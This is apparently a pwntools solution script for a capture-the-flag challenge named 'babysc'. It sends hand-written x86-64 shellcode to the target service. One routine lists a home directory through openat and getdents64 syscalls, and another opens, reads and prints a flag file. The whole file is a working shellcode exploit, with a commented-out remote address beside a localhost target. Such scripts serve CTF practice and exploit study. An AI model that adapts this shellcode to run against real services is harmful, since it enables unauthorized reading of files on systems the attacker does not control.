#!/usr/bin/python

from pwn import *

# /home/babysc/55ffa688e1003d7020b4b2b0e84b85fc/flag.txt

def getdir():
	global r
	payload = asm("""
		
		mov rax, 0x101010101010101
	    push rax
		mov rax, 0x101010101010101 ^ 0x2f63737962
		xor [rsp], rax
		mov rax, 0x61622f656d6f682f
		push rax
		mov rsi,rsp
		xor edi,edi
		xor edx,edx
		xor rax,rax
		mov ax,0x101
		syscall

		xchg rax,r15

		mov rdi,r15
		mov rsi,rsp
		add rsi,0x100
		push 0x200
		pop rdx
		push 0xd9
		pop rax
		syscall

		push 0x100
		pop rdx
		push 1
		pop rdi
		push 1
		pop rax
		syscall
	""")
	r.sendafter("Shellcode: ",payload)
	r.interactive()

def orw():
	global r
	payload = asm(shellcraft.openat(0,"/home/babysc/55ffa688e1003d7020b4b2b0e84b85fc/flag.txt"))
	payload += asm("""
		xchg rax, rdi
		push 100
		pop rdx
		syscall

		xchg rax, rdx
		push 1
		pop rax
		push 1
		pop rdi
		syscall
	""")
	r.sendafter("Shellcode: ",payload)
	r.interactive()

context.arch = "amd64"
context.terminal = ["/mnt/d/wsl-terminal-tabbed/open-wsl.exe","-e"]
exe = ELF("./babysc")

if len(sys.argv) < 2:
	# r = gdb.debug([exe.path],gdbscript="""
	# 	pie break *0xe63
	# 	c
	# """)
	r = process([exe.path])
else:
	# r = remote("139.59.97.212",23339)
	r = remote("localhost",23339)

getdir()
# orw()